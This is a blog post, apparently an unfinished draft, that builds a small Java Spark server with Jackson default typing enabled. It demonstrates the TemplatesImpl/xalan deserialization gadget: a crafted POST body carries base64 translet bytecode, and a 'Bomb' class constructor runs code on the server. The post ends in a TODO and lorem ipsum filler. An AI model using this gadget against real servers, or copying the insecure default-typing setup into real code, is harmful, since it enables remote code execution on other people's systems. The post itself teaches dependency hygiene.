---
layout: post
title:  'How one request can kill your enterprise'
author: hendrik
featuredImage: exploit
excerpt: 'As developers we always try to create bugfree and secure applications .Sometimes the most critical issues are not part of our code but of its dependencies. This post shows how
security issues in dependencies can be used to create horrible attack scenarios of your systems. I will show one exploit in a simply Java based server application that can be used to do
mostly everything with your whole system.'
categories: [Java, OpenJDK]
header:
  text: An example of a small but evil <span class="my-karakun">exploit<span>
  image: post
---
In this post I will show a possible exploit of a small Java based enterprise application. The bugs that I use for the exploit are already fixed since 2017 and new versions of the libraries are out
since more than a year. I do not want to blame any library or developer with this blog post. My main goal is to show you how important it is to know the dependencies of your application and try to 
always have an up to date version of your dependencies. By doing so you will always benefit from security fixes and avoid of being attackable by exploits that were made available for the public.

![Security duke]({{ "/assets/posts/2019-01-25-security-exploits/security-duke.png" | absolute_url }})

## Creating a small server application

To give you an example of a security issue and an exploit that will use this issue to do really bad things I will create a minimalistic server application in Java.
The application should handle some data items and should provide a http endpoi nt by that a client can receive the current item set and mutate the data.

To create such application you can choose between several Java based framework like Spring (Boot) or JakartaEE. In this concrete sample I decieded to use one of the smallest
frameworks that I know for such usecase. By using [spark](http://sparkjava.com) I can easily define a small http server in just 1 Java class. To make my life easier I will
add [jackson](https://github.com/FasterXML/jackson) and [xalan](https://xalan.apache.org) as additional dependencies to provide automatic JSON-Object-Mapping for my application. 
Since I decided to use Maven for such small example the `pom.xml` file might look like this:

{% highlight xml %}
<project>
    <groupId>com.karakun.dev</groupId>
    <artifactId>exploit</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>com.sparkjava</groupId>
            <artifactId>spark-core</artifactId>
            <version>2.7.2</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.8.8</version>
        </dependency>
        <dependency>
            <groupId>xalan</groupId>
            <artifactId>xalan</artifactId>
            <version>2.7.2</version>
        </dependency>
    </dependencies>
</project>
{% endhighlight %}

As you can see in the maven definition our application will only need 3 dependencies. If you have a deeper look you will see that we already depend on **23** libraries. 
The 3 dependencies that are defined in the pom file depend on several other libraries. All this dependencies are transitive dependencies for our application and will 
be added to the classpath. The following graph shows all libraries from that our little application depends based on the given pom:

![Dependency graph]({{ "/assets/posts/2019-01-25-security-exploits/dependency-graph.png" | absolute_url }})

The most dependencies in the graph are transitive depencies from spark. Even if this library is one of the smallest http server libs you can find it already brings a lot of things with it.
For our small application this much more than we need since we do not want to add security, use websockets or code against the servlet API. This should not be any blame against spark. I just want to show you here that your applications often depend on much more things than you might know ;)  

Let's start to code our example. The first thing that we want to define is a plain POJO. I decided to call it "Product" and defined it as a small Java bean with some properties / fields. 
As you can see in the following definition of the class there is absolutelly no magic in this code. I even do not defined `toString()`, `equals()` or `hashcode()` (which could be done but do not change anything in the sample). This "Product" data type will be the only data that our application can handle. Here is the complete code of the `Product` class:

{% highlight java %}
public class Product {

    private String name;

    private Object data;

    public Product() {
    }

    public Product(final String name, final Object data) {
        this.name = name;
        this.data = data;
    }

    public String getName() {
        return name;
    }

    public void setName(final String name) {
        this.name = name;
    }

    public Object getData() {
        return data;
    }

    public void setData(final Object data) {
        this.data = data;
    }
}
{% endhighlight %}

In our small application we want to manage such products. Instead of using a dtabase and maybe JPA (as most of us would do for real application)
I just choosed the most easy way to manage such data: a Java `List`. By defining and managing such collection in our application we can easily hold 
a list of products in memory and work with them at runtime. Since several clients might access our sever I decided to use a `CopyOnWriteArrayList` as
concrete list type in my application. by doing so we won't end in any `ConcurrentModificationException`. The follwoing code snippet shows how easy such
collection with some initial data can be created:

{% highlight java %}
final List<Product> database = new CopyOnWriteArrayList<>();
database.add(new Product("car", randomData()));
database.add(new Product("boat", randomData()));
database.add(new Product("plane", randomData()));
{% endhighlight %}

The `randomData()` method that is used in this snippet creates some random metadata for the `Product` instances. You will see the code
of this method later. For our small example this few lines of code are really everything that we need as a small in memory data store. By
using the list we can easily add a new product to our "database" or return the complete content.

As a next step we will use spark to provide http / rest endpoints for exactly this functionallity. We want to define an endpoint that can be
reached by a `GET` request to return all our products and a second endpoint that can be reached by a `POST` request. This endpoint will add a new
product that is defined in the body of the http request to our database.

![HTTP endpoints]({{ "/assets/posts/2019-01-25-security-exploits/get-post.png" | absolute_url }})

The following code snippet shows in a simplyfied form how this can be achived by using spark:

{% highlight java %}
//Configure HTTP server
Spark.port(8888);

//Define endpoints
Spark.get("/products", (request, response) -> serializer.writeValueAsString(database));
Spark.post("/products", (request, response) -> database.add(deserializer.readValue(request.body(), Product.class)));
{% endhighlight %}

For sure the post lambda needs null checks and exception handling. Next to this the `serializer` and `deserializer` objects that are used in the snippet are instances 
of the `ObjectMapper` class from jackson. This objects will be used to transform the JSON of the http requests and resonses to Java objects. Let's put the database and server 
code together in a single Java class. As you can see in the following code you can easily create such simple server with abou 50 lines of code:

{% highlight java %}
public class MyServer {

    private static final List<Product> database = new CopyOnWriteArrayList<>();

    private static final ObjectMapper deserializer = new ObjectMapper().enableDefaultTyping();
    private static final ObjectMapper serializer = new ObjectMapper();

    public static void main(String[] args) {

        //Adding some basic data
        database.add(new Product("car", randomData()));
        database.add(new Product("boat", randomData()));
        database.add(new Product("plane", randomData()));

        //Configure HTTP server
        Spark.port(8888);

        //Define endpoints
        Spark.get("/products", (request, response) -> {
            return serializer.writeValueAsString(database);
        });

        Spark.post("/products", (request, response) -> {
            try {
                final Product product = deserializer.readValue(request.body(), Product.class);
                Optional.ofNullable(product).ifPresent(p -> database.add(p));
                return "THANKS";
            } catch (final Exception e) {
                return "ERROR";
            }
        });
    }

    private static Map<String, String> randomData() {
        final String[] colors = {"yellow", "red", "green"};
        final Map<String, String> data = new HashMap<>();
        data.put("cost", new Random().nextInt(100_000) + "");
        data.put("color", colors[new Random().nextInt(colors.length)]);
        return data;
    }
}
{% endhighlight %}

At this point we can start our server and call the defined enpoints. To do such calls you can use any tool that provides
the functionallity to execute HTTP requests. I use [PAW](https://paw.cloud) on my Mac but you can use any other tool
like [curl](https://curl.haxx.se) or [postman](https://www.getpostman.com) for example.

The following snippet shows the raw content of a http get request to receive the product list from the server

{% highlight java %}
GET /products HTTP/1.1
Host: localhost:8888
Connection: close
User-Agent: Paw/3.1.7 (Macintosh; OS X/10.14.2) GCDHTTPRequest
{% endhighlight %}

When doing the request you will receive a response that contains the product list in JSON format as you can see in the following screenshot of Paw:

![Paw screen]({{ "/assets/posts/2019-01-25-security-exploits/paw.png" | absolute_url }})

Once you added a new product by doing a `POST` http request you see the new product in this JSON list when doing a new `GET` request. For posting a 
a new product the body of your http requests needs to look like this:

{% highlight json %}
{
  "name":"jetpack",
  "data":["java.util.HashMap",{"cost":"200_000","color":"yellow"}]
}
{% endhighlight %}

Thanks to the jackson and xalan dependency our server application will automatically create a new `Product` instance from the given JSON definition.

## Let's hack

Based on the current state of our application and the information we have about its implementation and endpoints we could think that we created a bulletproof application 
that can not be hacked in any way. By reviewing everything the follwoing points might support this opinion:

- The application can only be accessed by 2 endpoints
- The endpoints are well defined and based on the http standard
- Internally exception handling is added to the endpoints
- Inernally the endpoints only have access to the data list
- The application is very small and therefore we understand the complete code
- We only use well known dependencies
- All dependencies are open source

By having this points in your mind you might be shocked when I tell you that I can get access to the native file system by only doing 1 http request against this application. To be true the file
system is only one example. Today I showed the sample at a JUG session and created a request against this application that changed the wallpaper of my operation system. While this is not really
dangerous it had a nice effect to the audiance to visualize that I can really do more or less everything on the system that hosts the given application.

![Bad request]({{ "/assets/posts/2019-01-25-security-exploits/bad-request.png" | absolute_url }})

All this can be easily achived by using an exploit. Everything I need to to is a `POST` request against the endpoint that our application offers to add a new `Product` instance. Instead of just
sending a JSON based description of a product that I want to add, the body of my http request looks like this:

{% highlight json %}
{
    "name": "bomb",
    "data": ["org.apache.xalan.xsltc.trax.TemplatesImpl",
        {
            "transletBytecodes" : [ "yv66vgAAADQAy........ABAHoAAwB7AHwAew==" ],
            "transletName": "oops!",
            "outputProperties": {}
        }
    ]
}
{% endhighlight %}

The content of the `transletBytecodes` property is much longer than shown in this snippet. But since you can not really read the content it do not make sense to show it completelly
here. Much more interesting is the general workflow that I used to create this http body and how it will be handled in our server application.

As already mentioned the content of the `transletBytecodes` property is a base64 encoded byte array. This byte array is the byte content of a compiled Java class. To create the base 64 string I wrote a java class compiled it and simply converted the by content of the class file to base64.

![Bad request]({{ "/assets/posts/2019-01-25-security-exploits/workflow.png" | absolute_url }})

If you want to try this on your own just compile a Java class and use any converter to create a base64 based string out of the content of the class file. If you want to can even create such tool by 
yourself with some lines of Java code:

{% highlight java %}
public class Encoder {

    public static void main(String[] args) throws Exception {
        byte[] classBytes = Files.readAllBytes(new File("target/classes/com/karakun/dev/Bomb.class").toPath());
        byte[] encodedBytes = Base64.getEncoder().encode(classBytes);
        System.out.println(new String(encodedBytes));
    }
}
{% endhighlight %}

The given code directly prints the base64 encoded string as output of the programm to your terminal. If you want to do this with a class that you can use for the exploit you need to
extend a specific class that is defined by xalan. By extending the abstract `org.apache.xalan.xsltc.runtime.AbstractTranslet` class you do not need to think about the 2 methods you
need to implement and can just leave the body of this methods empty. The really interesting part is the constructor of your class. Here you can easily add some custom code like I did
in the follwoing sample:

{% highlight java %}
public class Bomb extends org.apache.xalan.xsltc.runtime.AbstractTranslet {

    public Bomb() {
      super.transletVersion = CURRENT_TRANSLET_VERSION;

      //Now we can do evil stuff
      System.out.println("BOOOOOOOOM!");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
{% endhighlight %}

If you transform such class to a base64 string as described above and send it to your server application the constructor of your custom class will be called on the server. With the
given example the server would print "BOOOOOOOOM!" as output in the terminal. Before we have a look at the internals and how this is even possible think about the evil potential of
this security issue. Instead of just printing a funny string we could write an algorithm that does horrible things on your system.

TODO: Pic

Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.

